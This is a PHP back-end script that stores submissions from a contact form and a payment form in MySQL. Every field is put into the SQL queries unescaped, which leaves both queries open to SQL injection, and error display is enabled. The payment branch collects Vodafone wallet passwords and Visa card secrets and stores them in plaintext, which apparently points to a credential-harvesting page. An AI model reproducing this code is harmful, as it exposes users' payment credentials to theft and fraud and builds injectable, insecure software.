<?php
include "db.php";

error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $type = $_POST["form_type"] ?? "";

    // ================= CONTACT =================
    if ($type == "contact") {

        $name = $_POST["name"] ?? "";
        $address = $_POST["address"] ?? "";
        $city = $_POST["city"] ?? "";
        $state = $_POST["state"] ?? "";
        $zip = $_POST["zip"] ?? "";
        $country = $_POST["country"] ?? "";

        $sql = "INSERT INTO contact_form (name, address, city, state, zip, country)
                VALUES ('$name', '$address', '$city', '$state', '$zip', '$country')";

        mysqli_query($conn, $sql);

        echo "success";
        exit();
    }

    // ================= PAYMENT =================
    elseif ($type == "payment") {

        $name = $_POST["name"] ?? "";
        $phone = $_POST["phone"] ?? "";
        $address = $_POST["address"] ?? "";
        $payment = $_POST["payment"] ?? "";

        $wallet = "";
        $pass = "";

        if ($payment == "vodafone") {
            $wallet = $_POST["vodafone_wallet"] ?? "";
            $pass = $_POST["vodafone_pass"] ?? "";
        } elseif ($payment == "visa") {
            $wallet = $_POST["visa_card"] ?? "";
            $pass = $_POST["visa_pass"] ?? "";
        }

        $sql = "INSERT INTO payment_orders 
        (name, phone, address, payment_method, wallet_number, wallet_pass)
        VALUES 
        ('$name', '$phone', '$address', '$payment', '$wallet', '$pass')";

        mysqli_query($conn, $sql);

        echo "success";
        exit();
    }
}
?>